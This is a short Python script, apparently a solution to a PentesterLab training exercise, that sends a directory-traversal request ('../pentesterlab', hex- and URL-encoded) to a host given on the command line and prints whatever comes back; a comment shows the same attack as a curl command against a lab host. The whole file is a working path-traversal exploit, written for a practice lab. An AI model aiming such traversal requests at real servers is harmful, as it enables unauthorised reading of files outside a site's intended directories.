# curl http://ptl-15ba15aa-4afe0518.libcurl.so/pentesterlab/%2e%2e%2fpentesterlab

import urllib
import requests
import sys
import argparse


parser = argparse.ArgumentParser()
parser.add_argument("host", help="enter a domain or IP address")
args = parser.parse_args()

host = sys.argv[1]


response = requests.get(host + '\x2e\x2e\x2fpentesterlab')

print(response.text)